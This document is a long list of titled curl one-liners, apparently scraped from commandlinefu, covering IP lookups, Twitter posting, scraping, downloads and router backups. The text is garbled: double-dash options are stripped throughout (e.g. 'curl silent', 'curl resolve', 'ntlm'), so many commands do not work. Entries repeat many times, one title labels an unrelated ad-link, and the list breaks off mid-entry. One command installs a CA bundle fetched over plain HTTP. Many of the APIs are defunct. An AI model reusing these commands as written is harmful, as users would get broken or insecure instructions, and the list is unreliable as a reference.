### Backup your OpenWRT config (only the config, not the whole system)
```sh
curl -d 'username=root&password=your-good-password' "http://router/cgi-bin/luci/admin/system/backup?backup=kthxbye" > `date +%Y%d%m`_config_backup.tgz
```

### Your GeoIP location on Google Maps
```sh
curl -s http://geoiplookup.wikimedia.org/|awk -F, '{print $3,$4}'|awk -F'"' '{print "http://maps.google.com/maps?q="$4 "," $8}'
```

### What is my public IP address
```sh
curl ifconfig.me
```

### Get your commandlinefu points (upvotes - downvotes)
```sh
curl -s http://www.commandlinefu.com/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\"command\"/{gsub(/&quot;/,"\"",$2); gsub(/&lt;/,"<",$2); gsub(/&gt;/,">",$2); gsub(/&amp;/,"\\&",$2); cmd=$2} /class=\"num-votes\"/{printf("%3i  %s\n", $2, cmd)}'
```

### Get your outgoing IP address
```sh
curl icanhazip.com
```

### Update Ping.fm status
```sh
curl -d api_key="$api_key" -d user_app_key="$user_app_key -d body="$body" -d post_method="default" http://api.ping.fm/v1/user.post
```

### Test load balancers
```sh
curl resolve subdomain.example.com:80:10.100.0.1 subdomain.example.com -I -s
```

### Check a server is up. If it isn't mail me.
```sh
curl -fs brandx.jp.sme 2&>1 > /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
```

### send tweets to twitter (and get user details)
```sh
curl basic user "user:pass" data-ascii "status=tweeting%20from%20%the%20linux%20command%20line" http://twitter.com/statuses/update.json
```

### return external ip
```sh
curl ipinfo.io
```

### Quick and dirty RSS
```sh
curl silent "FEED ADDRESS" |sed -e 's/<\/[^>]*>/\n/g' -e 's/<[^>]*>//g
```

### Find the annual salary of any White House staffer.
```sh
curl -s "http://www.socrata.com/api/views/vedg-c5sb/rows.json?search=Axelrod" | grep "data\" :" | awk '{ print $17 }'
```

### Get the header of a website
```sh
curl -sI http://blog.binfalse.de
```

### Random quote from Borat  no html parsing
```sh
curl -s "http://smacie.com/randomizer/borat.txt" | shuf -n 1 -
```

### Get info about a GitHub user
```sh
curl http://github.com/api/v1/yaml/git
```

### Get info about a GitHub project
```sh
curl http://github.com/api/v1/yaml/search/vim
```

### Get http headers for an url
```sh
curl -I www.commandlinefu.com
```

### online MAC address lookup
```sh
curl -s http://www.macvendorlookup.com/getoui.php?mac=$1 | sed -e 's/<[^>]\+>//g'; echo
```

### online MAC address lookup
```sh
curl -s http://standards.ieee.org/regauth/oui/oui.txt | grep $1
```

### Say something out loud
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=$(echo "$@" | sed 's/ /+/g')" | play -t mp3 -
```

### Download a numbered sequence of files
```sh
curl silent -O "http://www.somewebsite.com/imagedir/image_[00-99].jpg"
```

### HTTP Get of a web page via proxy server with login credentials
```sh
curl -U username[:password] -x proxyserverIP:proxyserverPort webpageURI
```

### grab all commandlinefu shell functions into a single file, suitable for sourcing.
```sh
curl -s http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25] | grep -oP "^\w+\(\)\ *{.*}"
```

### import gpg key from the web
```sh
curl -s http://defekt.nl/~jelle/pubkey.asc | gpg import
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Which Twitter user are you?
```sh
curl -s http://twitter.com/username | grep 'id="user_' | grep -o '[0-9]*'
```

### Retrieve the size of a file on a server
```sh
curl -s "$URL" |wc -c
```

### get delicious bookmarks on your shell (text version :-))
```sh
curl -u 'username'   https://api.del.icio.us/v1/posts/all   |  sed 's/^.*href=//g;s/>.*$//g;s/"//g' | awk '{print $1}' | grep 'http'
```

### post data with a http request
```sh
curl -d "a1=v1&a2=v2" url
```

### Get an authorization code from Google
```sh
curl -s https://www.google.com/accounts/ClientLogin -d Email=$email -d Passwd=$password -d service=lh2 | grep Auth | sed 's/Auth=\(.*\)/\1/'
```

### Save all commands from commandlinefu.com to plain text sort by vote
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-9000:25] | grep -vE "_curl_|\.com by David" > clf-ALL.txt
```

### Shorten any Url using bit.ly API, using your API Key which enables you to Track Clicks
```sh
curl "http://api.bit.ly/shorten?version=2.0.1&longUrl=<LONG_URL_YOU_WANT_SHORTENED>&login=<YOUR_BITLY_USER_NAME>&apiKey=<YOUR_API_KEY>"
```

### translate what is in the clipboard in english and write it to the terminal
```sh
curl -s "http://ajax.googleapis.com/ajax/services/language/translate?langpair=|en&v=1.0&q=`xsel`" |cut -d \" -f 6
```

### OpenDns IP update via curl
```sh
curl -i -m 60 -k -u user:password 'https://updates.opendns.com/account/ddns.php?'
```

### Twitter update from terminal    (pok3's snipts ?)
```sh
curl -u YourUsername:YourPassword -d status="Your status message go here" http://twitter.com/statuses/update.xml
```

### posts an xml file to a webservice with curl
```sh
curl -X POST -d @request.xml -H 'Content-Type: text/xml' https://hostname/context/service
```

### Get My Public IP Address
```sh
curl -s http://whatismyip.org/
```

### Get your outgoing IP address
```sh
curl -s httpbin.org/ip | jq -r .origin
```

### Displays the current time using HTTP
```sh
curl -Is google.com | grep Date
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | jshon -e world -e population -u
```

### Random quote from Borat
```sh
curl -s http://smacie.com/randomizer/borat.html | sed -nE "s# *<td valign=\"top\"><big><big><big><font face=\"Comic Sans MS\">(.*)</font></big></big></big></td>#\1#p"
```

### Scrape commands from commandline fu's 1st page
```sh
curl -s http://www.commandlinefu.com/commands/browse|egrep '("Fin.*and"|<div class="command">.*</div>)'|sed 's/<[^<]*>//g'|ruby -rubygems -pe 'require "cgi"; $_=sprintf("\n\n%-100s\n\t#%-20s",CGI.unescapeHTML($_).chomp.strip, gets.lstrip) if $.%2'
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -sL http://www.dell.com/support/troubleshooting/us/en/555/Servicetag/$(dmidecode -s system-serial-number) | html2text -style pretty | awk -F\. '/with an end date of/ { print $1 "."}'
```

### Get your outgoing IP address
```sh
curl ifconfig.me
```

### Get curenttly playing track in Last.fm radio
```sh
curl -s http://ws.audioscrobbler.com/1.0/user/<user_id>/recenttracks.rss|grep '<title>'|sed -n '2s/ *<\/\?title>//gp'
```

### List the popular module namespaces on CPAN
```sh
curl http://www.cpan.org/modules/01modules.index.html |awk '{print $1}'|grep -v "<"|sort|uniq -c|grep -v " +[0-9] "
```

### Get your public ip using dyndns
```sh
curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
```

### Look up the definition of a word
```sh
curl dict://dict.org/d:something
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" > hello.mp3
```

### Translates a phrase from English to Portuguese
```sh
curl -s -A "Mozilla" "http://translate.google.com.br/translate_a/t?client=t&text=Hi+world&hl=pt-BR&sl=en&tl=pt&multires=1&ssel=0&tsel=0&sc=1" | awk -F'"' '{print $2}'
```

### Get your external IP address
```sh
curl ifconfig.me/all/json
```

### Use curl to save an MP3 stream
```sh
curl -sS -o $outfile -m $showlengthinseconds $streamurl
```

### Follow a new friend on twitter
```sh
curl -u USERNAME:PASSWORD -d "" http://twitter.com/friendships/create/NAMEOFNEWFRIEND.xml?follow=true
```

### Get your external IP address ( 10 characters long )
```sh
curl ip.nu
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Tweet from Terminal to twitter !
```sh
curl -u yourusername:yourpassword -d status=?Your Message Here? https://twitter.com/statuses/update.xml
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl -s 'http://www.discogs.com/search?q=724349691704' | sed -n '\#/release/#{s/^<div>.*>\(.*\)<\/a><\/div>/\1/p}'
```

### Find a CommandlineFu users average command rating
```sh
curl -s www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}'
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### Fixes Centos 6.2 yum's metalink certificate errors
```sh
curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt
```

### Get a facebook likes quantity from CLI
```sh
curl - https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%27<URL>%27 | awk -F\" '{ print $7 }' | awk -F":" '{ print $2 }' | awk -F"," '{ print $1 }'
```

### Grab the top 5 CLFUContest one-liners
```sh
curl -sL http://goo.gl/3sA3iW | head -16 | tail -14
```

### Update twitter via curl (and also set the "from" bit)
```sh
curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http://twitter.com/statuses/update.xml
```

### Download all Delicious bookmarks
```sh
curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
```

### a function to find the fastest DNS server
```sh
curl -s http://public-dns.info/nameserver/br.csv| cut -d, -f1 | xargs -i timeout 1 ping -c1 -w 1 {} | grep time | sed -u "s/.* from \([^:]*\).*time=\([^ ]*\).*/\2\t\1/g" | sort -n | head -n1
```

### Get your external IP address if your machine has a DNS entry
```sh
curl www.whatismyip.com/automation/n09230945.asp
```

### Check if the LHC has destroyed the world
```sh
curl -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### backup delicious bookmarks
```sh
curl user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
```

### Use Dell Service Tag $1 to Find Machine Model [Model Name and Model Number]
```sh
curl -s $dellurl$1 | tr "\"" "\n" | grep "</td></tr><tr><td class=" -m 2 | grep -v "Service Tag" | sed 's/>//g' | sed 's/<\/td<\/tr<tr<td class=//g'
```

### Random Futurama quote
```sh
curl -s "http://subfusion.net/cgi-bin/quote.pl?quote=futurama&number=1" |awk '/<body><br><br><b><hr><br>/ {flag=1;next} /<br><br><hr><br>/{flag=0} flag {print}'
```

### Get all files of particular type (say, PDF) listed on some wegpage (say, example.com)
```sh
curl -s http://example.com | grep -o -P "<a.*href.*>" | grep -o "http.*.pdf" |  xargs -d"\n" -n1  wget -c
```

### Download all Red Hat Manuals - A better way by user Flatcap
```sh
curl -s https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^"]*Linux/7/pdf[^"]*' | xargs -I{} wget https://access.redhat.com{}
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl -s http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | sed -n '/<tr valign="top">/{s/<[^>]*>//g;p}'
```

### Get ElasticSearch configuration and version details
```sh
curl -XGET 'localhost:9200'
```

### Creating shortened URLs from the command line
```sh
curl -s http://tinyurl.com/create.php?url=http://<website.url>/ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' | uniq
```

### A command to post a message and an auto-shortened link to Twitter. The link shortening service is provide by TinyURL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s http://tinyurl.com/api-create.php?url=URL_GOES_HERE)" -d source="cURL" http://twitter.com/statuses/update.json -o /dev/null
```

### shorten url using curl, sed and is.gd
```sh
curl -s -d URL="$1" http://is.gd/create.php | sed '/Your new shortened/!d;s/.*value="\([^"]*\)".*/\1/'
```

### random xkcd comic as xml
```sh
curl -sL 'dynamic.xkcd.com/comic/random/' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### Find out how old a web page is
```sh
curl -Is http://osswin.sourceforge.net/ | grep Mod
```

### Get your public ip
```sh
curl -s http://sputnick-area.net/ip
```

### List NYC startups that are hiring
```sh
curl -s -L http://nytm.org/made-in-nyc | grep "(hiring)" | sed -re 's/<([^>]+)>//g;s/^([ \t]*)//g'
```

### Bitcoin prices from the command line
```sh
curl btc.cm/last
```

### Download all files from podcast RSS feed
```sh
curl http://url/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Retrieve "last modified" timestamp of web resource in UTC seconds
```sh
curl silent head "${url}" | grep 'Last-Modified:' | cut -c 16- | date -f - +'%s'
```

### The wisdom of Cave Johnson
```sh
curl -s http://www.cavejohnsonhere.com/random/ | grep quote_main | cut -d \> -f 2- | fmt -w $(tput cols)
```

### Download all images from a 4chan thread
```sh
curl -s $1 | grep -o -i '<a href="//images.4chan.org/[^>]*>' | sed -r 's%.*"//([^"]*)".*%\1%' | xargs wget
```

### Get My Public IP Address
```sh
curl -s http://myip.dk/ | egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

### Send email with curl and gmail
```sh
curl -n ssl-reqd mail-from "<user@gmail.com>" mail-rcpt "<user@server.tld>" url smtps://smtp.gmail.com:465 -T file.txt
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Get HTTP status code with curl AND print response on new line
```sh
curl -s -o /dev/null -w "%{http_code}\n" localhost
```

### List of countries
```sh
curl -s http://www.infoplease.com/countries.html | grep "<td"  | grep ipa  | sed -e 's#html">#\n#g'  | cut -f 1 -d\<  | grep -v "^\ \ *$"
```

### Automagically create a /etc/hosts file based on your DHCP list (only works on Linksys WRT54G router)
```sh
curl -s -u $username:$password http://192.168.1.1/DHCPTable.htm | grep '<td>.* </td>' | sed 's|\t<td>\(.*\) </td>\r|\1|' | tr '\n' ';' | sed 's/\([^;]*\);\([^;]*\);/\2\t\1\n/g'
```

### List your Boxee queue
```sh
curl -u <username> http://app.boxee.tv/api/get_queue | xml2 | grep /boxeefeed/message/description | awk -F= '{print $2}'
```

### return external ip
```sh
curl inet-ip.info
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -sI http://slashdot.org/ | sed -nr 's/X-(Bender|Fry)(.*)/\1\2/p'
```

### download all jpg in webpage
```sh
curl -sm1 http://www.website.com/ | grep -o 'http://[^"]*jpg' | sort -u | wget -qT1 -i-
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### git clone all user repos
```sh
curl -s https://api.github.com/users/tuxcanfly/repos | jq -r  'map(select(.fork == false)) | map(.url) | map(sub("https://api.github.com/repos/"; "git clone git@github.com:")) | @sh' | xargs -n1 sh -c]
```

### Check remote hosts server
```sh
curl -Is http://www.google.com | grep -E '^Server'
```

### Get Stuff.
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### lookup a short url with curl
```sh
curl -I -L http://t.co/mQUxL6yS
```

### Another Curl your IP command
```sh
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p'
```

### Fetches a Reddit user's ($USER) link karma
```sh
curl -s http://www.reddit.com/user/$USER/about.json | tr "," "\n" | grep "link_karma" | tr ": " "\n" | grep -E "[0-9]+" | sed s/"^"/"Link Karma: "/
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Send an http HEAD request w/curl
```sh
curl -I http://localhost
```

### Get My Public IP Address
```sh
curl ifconfig.me
```

### show WAN IP
```sh
curl ifconfig.me
```

### JSON processing with Python
```sh
curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | less -R
```

### Update twitter via curl
```sh
curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Upload an image to Twitpic
```sh
curl -F "username=mytwiterlogin" -F "password=mytwitterpassword" -F "message=My image description" -F media=@"./image.png" http://twitpic.com/api/uploadAndPost
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" | play -t mp3 -
```

### Download a TiVo Show
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest "$(curl -s -c /tmp/cookie -k -u tivo:$MAK digest https://$tivo/nowplaying/index.html | sed 's;.*<a href="\([^"]*\)">Download MPEG-PS</a>.*;\1;' | sed 's|\&amp;|\&|')" | tivodecode -m $MAK  - > tivo.mpg
```

### Play 2600 off the hook over ssh
```sh
curl -L -s `curl -s http://www.2600.com/oth-broadband.xml` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### Play a podcast via XPath and mpg123
```sh
curl -L -s `curl -s [http://podcast.com/show.rss]` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### get WAN / external IP
```sh
curl tnx.nl/ip
```

### Get magnet link from URL
```sh
curl -s http://host.net/url.html | grep magnet | sed -r 's/.*(magnet:[^"]*).*/\1/g'
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Command Line to Get the Stock Quote via Yahoo
```sh
curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
```

### upload a file via ftp
```sh
curl -u user:passwd -T /home/dir/local_file_to_upload ftp://your_host.com/subdir/
```

### Spelling Suggestion
```sh
curl -s "http://search.yahooapis.com/WebSearchService/V1/spellingSuggestion?appid=YahooDemo&query=mozmbque"|sed -n -e 's/.*<Result>\(.*\)<\/Result>.*/\1/p'
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Download all files from a Gist without Git
```sh
curl -L https://gist.github.com/westonruter/ea038141e46e017d280b/download | tar -xvz strip-components=1
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl http://www.discogs.com/search?q=724349691704 2> /dev/null | grep \/release\/ | head -2 | tail -1 | sed -e 's/^<div>.*>\(.*\)<\/a><\/div>/\1/'
```

### Get your public ip
```sh
curl -s http://icanhazip.com/
```

### Get the amount of users currently registered at the DudaLibre.com Linux Counter.
```sh
curl silent http://www.dudalibre.com/gnulinuxcounter?lang=en | grep users | head -2 | tail -1 | sed 's/.*<strong>//g' | sed 's/<\/strong>.*//g'
```

### Send a message to Kodi (XBMC)
```sh
curl -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"GUI.ShowNotification","params":{"title":"This is the title of the message","message":"This is the body of the message"},"id":1}' http://i3c.pla.lcl:8080/jsonrpc
```

### Make a HTTP request using curl with POST method
```sh
curl verbose -d "hello=world" http://mydomain.com
```

### get the current weather in NYC, in human readable form
```sh
curl -s poncho.is/forecast/new_york/today/ | grep -E 'og:title|og:description' | cut -d\" -f4 | awk '{print $0,"<p>"}' | lynx -stdin -dump
```

### copy remote ssh session output to local clipboard
```sh
curl "https://coinurl.com/api.php?uuid=5378..........5&url=http://www.commandlinefu.com"
```

### Get number of diggs for a news URL
```sh
curl -s "http://services.digg.com/stories?link=$NEWSURL&appkey=http://www.whatever.com&type=json"  | python -m simplejson.tool | grep diggs
```

### Backup your precious Tomato Router Stats
```sh
curl http://root:PASSWORD@ROUTER_DYN_DNS/bwm/tomato_rstatsa001839ceb1d4.gz?_http_id=HTTPID > $HOME/Dropbox/Backups/tomato_stats.gz
```

### Get URL's from a webpage
```sh
curl url | egrep -o '(http|https)://[a-z0-9]*\.[a-z0-9]*\.[a-z0-9]*'|sort |uniq
```

### Get HTTP headers using curl, but still perform a GET
```sh
curl -sSi <URL> | sed '/^\r$/q'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### moreplayingaround
```sh
curl -s -u username:passwd http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |festival tts
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/wg/|sed -r 's/.*href="([^"]*).*/\1\n/g'|grep images|xargs wget
```

### Dump filtered twitter stream to a file
```sh
curl -s -u $USERNAME -X POST -d "track=obama,barack" https://stream.twitter.com/1.1/statuses/filter.json -o twitter-stream.out
```

### Get your external IP address
```sh
curl l2.io/ip
```

### Shorten url using bit.ly API
```sh
curl -s data-urlencode 'longUrl='$1 data-urlencode 'login='$login data-urlencode 'apiKey='$apikey 'http://api.bit.ly/shorten?version=2.0.1&format=xml' | xmlstarlet sel -T -t -m "//shortUrl" -v "." | line
```

### Basic monitor for a website or API looking at HTTP response codes
```sh
curl write-out %{http_code} connect-timeout 10 max-time 20 -s -I -L http://google.com output /dev/null
```

### Print the lastest stable version of Perl
```sh
curl -s http://www.perl.org/get.html | grep -m1 '\.tar\.gz' | sed 's/.*perl-//; s/\.tar\.gz.*//'
```

### View the newest xkcd comic.
```sh
curl -s 'xkcd.com' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### geoip information
```sh
curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP:/!d;s/<[^>][^>]*>//g'
```

### What is my ip?
```sh
curl http://www.whatismyip.org/
```

### back up your commandlinefu contributed commands
```sh
curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
```

### What is my ip?
```sh
curl -s mi-ip.net | grep '"ip"' | cut -f2 -d ">" | egrep -o '[0-9.]+'
```

### Retrieve the final URL after redirect
```sh
curl $URL -s -L -o /dev/null -w '%{url_effective}'
```

### get daily wizard of id comic
```sh
curl -o id.gif `date +http://d.yimg.com/a/p/uc/%Y%m%d/largeimagecrwiz%y%m%d.gif`
```

### Get current stable kernel version string from kernel.org
```sh
curl -s kernel.org | grep '<strong>' | head -3 | tail -1 | cut -d'>' -f3 | cut -d'<' -f1
```

### extract XML RSS etc by tags such as <title> or <code> or <description>
```sh
curl ${URL} 2>/dev/null|grep "<${BLOCK}>"|sed -e "s/.*\<${BLOCK}\>\(.*\)\<\/${BLOCK}\>.*/\1/g"
```

### Get the state (HTTP code) of a resource from its URL
```sh
curl -s -L head -w "%{http_code}\n" URL | tail -n1
```

### display the hover text of the most recent xkcd
```sh
curl -s 'http://xkcd.com/rss.xml' | xpath '//item[1]/description/text()' 2>&1 | sed -n 's/.*title="\([^"]*\)".*/\1/p' | fold -s
```

### Output the latest linux kernel versions from kernel.org
```sh
curl 'https://www.kernel.org/kdist/finger_banner'
```

### Check if the LHC has destroyed the world
```sh
curl -q -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### Display current temperature anywhere in the world in Farenheit
```sh
curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_f data..//;s/....temp_c data.*//;p" | figlet
```

### Send an http HEAD request w/curl
```sh
curl -i -X HEAD http://localhost/
```

### Clone all github repos of a user
```sh
curl -s "https://api.github.com/users/${USERNAME}/repos" | ruby -rubygems -e 'require "json"; JSON.load(STDIN.read).each {|repo| %x[git clone #{repo["ssh_url"]} ]}'
```

### backup and synchronize entire remote folder locally (curlftpfs and rsync over FTP using FUSE FS)
```sh
curlftpfs ftp://YourUsername:YourPassword@YourFTPServerURL /tmp/remote-website/ && rsync -av /tmp/remote-website/* /usr/local/data_latest && umount /tmp/remote-website
```

### Search commandlinefu from the CLI
```sh
curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |html2text -width 100
```

### Find your Amazon EC2 instance type
```sh
curl -s http://169.254.169.254/latest/meta-data/instance-type
```

### What is my public IP address
```sh
curl -s checkip.dyndns.org|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
```

### Send youtube video to Kodi
```sh
curl -i -X POST -d '{"jsonrpc": "2.0", "method": "Player.Open", "params": {"item": { "file" : "plugin://plugin.video.youtube/play/?video_id=YOUTUBEID"}}, "id": 1}' http://username:password@kodi/jsonrpc -H "Content-Type: application/json"
```

### Shorten url with is.gd using curl, perl
```sh
curl -s "http://is.gd/api.php?longurl=[long_url]"
```

### Get own public IP address
```sh
curl -s http://wtfismyip.com/text
```

### Get IP address from Tor exit-node
```sh
curl -s -d "CSField=Name" -d "CSInput=BostonUCompSci" http://torstatus.blutmagie.de/index.php | grep -oP "ip=\K(\d+)(\.\d+){3}"
```

### Download all files from a Github gist individually
```sh
curl -sS remote-name-all $(curl -sS https://api.github.com/gists/997ccc3690ccd3ac5196211aff59d989 | jq -r '.files[].raw_url')
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### Submit data to a HTML form with POST method and save the response
```sh
curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
```

### Save the Top 2500 commands from commandlinefu to a single text file
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt
```

### Amazing real time picture of the sun in your wallpaper
```sh
curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin
```
### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### print unread gmail message
```sh
curl -su username:passwd https://mail.google.com/mail/feed/atom | xmlstarlet sel -N x="http://purl.org/atom/ns#" -t -m //x:entry -v 'concat(position(), ":", x:title)' -n
```

### Get your external public IP address
```sh
curl icanhazip.com
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Create cookies to log in to website
```sh
curl -L -d "uid=<username>&pwd=<password>" http://www.example.com -c cookies.txt
```

### Geo Temp
```sh
curl -s www.google.com/ig/api?weather=$(curl -s api.hostip.info/get_html.php?ip=$(curl -s icanhazip.com) | sed -e'1d;3d' -e's/C.*: \(.*\)/\1/' -e's/ /%20/g' -e"s/'/%27/g") | sed 's|.*<t.*f data="\([^"]*\)"/>.*|\1\n|'
```

### Conversion of media stream
```sh
curl 'AudioStream' | ffmpeg -i - -acodec libvorbis file.ogg
```

### geoip information
```sh
curl -s ifconfig.me|tee >(xargs geoiplookup)
```

### my ip
```sh
curl ip.appspot.com
```

### Upload documents from linux to MS SHarepoint using curl
```sh
curl ntlm -u <your Active-Directory-Domain>/<your-domain-username> -T /path/to/local/$FILE http://sharepoint.url.com/doc/library/dir/
```

### Extract tarball from internet without local saving
```sh
curl http://example.com/a.gz | tar xz
```

### Download a zipped file and extract it in one line
```sh
curl -Ss https://releases.hashicorp.com/packer/1.0.0/packer_1.0.0_linux_amd64.zip | zcat > packer
```

### Fetch current song from last.fm
```sh
curl -s http://www.last.fm/user/$LASTFMUSER | grep -A 1 subjectCell | sed -e 's#<[^>]*>##g' | head -n2 | tail -n1 | sed 's/^[[:space:]]*//g'
```

### Print all members of US House of Representatives
```sh
curl "http://www.house.gov/house/MemberWWW.shtml" 2>/dev/null | sed -e :a -e 's/<[^>]*>//g;/</N;//ba' | perl -nle 's/^\t\t(.*$)/ $1/ and print;'
```

### External IP address
```sh
curl ifconfig.me
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Call remote web service
```sh
curl -D - -X POST -H 'Content-type: text/xml' -d @XML http://remote_server:8080/web-service/soap/WSName
```

### Get your external IP address
```sh
curl ifconfig.me/all/xml
```

### Speaks latest tweet by Obama (os x)
```sh
curl "http://api.twitter.com/1/statuses/user_timeline.xml?count=1&screen_name=barackobama" | egrep -w "<text>(.*)</text>" | sed -E "s/<\/?text>//g" | say
```

### Random unsigned integer
```sh
curl -s "https://www.random.org/cgi-bin/randbyte?nbytes=4" | od -DAn
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com | html2text | sed '$d'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Display current temperature anywhere in the world in Celcius
```sh
